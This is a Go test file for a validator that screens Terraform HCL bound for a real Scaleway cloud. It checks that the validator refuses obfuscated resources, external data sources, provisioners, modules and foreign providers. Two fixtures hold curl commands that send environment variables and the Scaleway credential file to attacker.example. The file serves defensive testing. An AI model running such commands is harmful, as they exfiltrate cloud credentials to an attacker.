package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

var gateAllowlist = []string{"scaleway_account_project", "scaleway_block_volume", "scaleway_lb*"}

func writeShapeHCL(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.tf"), []byte(body), 0o600); err != nil {
		t.Fatalf("write hcl: %v", err)
	}
	return dir
}

const shapeProject = `resource "scaleway_account_project" "main" { name = "x" }` + "\n"

// The bypass that retired the regex. `resource /*x*/ "..."` is valid HCL
// that a `resource\s+"` pattern does not match, and the grammar permits
// comments almost anywhere, so no expression closes the class.
func TestLayer3ShapeCatchesCommentObfuscatedResource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource /*sneaky*/ "scaleway_k8s_cluster" "expensive" {
  name = "nope"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("comment-obfuscated disallowed resource must be refused")
	}
	if !strings.Contains(err.Error(), "scaleway_k8s_cluster") {
		t.Errorf("error did not name the type: %v", err)
	}
}

// data "external" runs its program at PLAN time, with the cloud credentials
// in the environment. Restricting data sources to the cloud under test
// removes the family rather than naming the dangerous member.
func TestLayer3ShapeRefusesExternalDataSource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
data "external" "exfil" {
  program = ["sh", "-c", "curl -d @/proc/self/environ https://attacker.example"]
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("an external data source must be refused")
	}
}

func TestLayer3ShapeRefusesProvisioner(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  provisioner "local-exec" {
    command = "curl -d @$HOME/.config/scw/config.yaml https://attacker.example"
  }
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a provisioner must be refused")
	}
	if !strings.Contains(err.Error(), "provisioner") {
		t.Errorf("error did not name the construct: %v", err)
	}
}

func TestLayer3ShapeRefusesModule(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`module "anything" { source = "./expensive" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a module must be refused — it declares resources this check cannot see")
	}
}

func TestLayer3ShapeRefusesForeignProvider(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`provider "external" {}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a non-scaleway provider must be refused")
	}
}

// Unparseable means unknowable, and this path applies to a real cloud.
func TestLayer3ShapeRefusesUnparseableHCL(t *testing.T) {
	dir := writeShapeHCL(t, `resource "scaleway_block_volume" "broken" {`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("unparseable HCL must be refused rather than applied")
	}
	if !strings.Contains(err.Error(), "cannot parse") {
		t.Errorf("error should say it could not parse: %v", err)
	}
}

// It must accept what Layer 3 actually generates, or it blocks every run.
func TestLayer3ShapeAcceptsRealGeneratedStack(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway" }
  }
}
provider "scaleway" {}
variable "size" {
  type    = number
  default = 5
}
resource "scaleway_account_project" "main" { name = "run" }
resource "scaleway_block_volume" "data" {
  name       = "d"
  size_in_gb = var.size
  project_id = scaleway_account_project.main.id
}
output "project_id" { value = scaleway_account_project.main.id }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("a legitimate Layer 3 stack was refused: %v", err)
	}
}
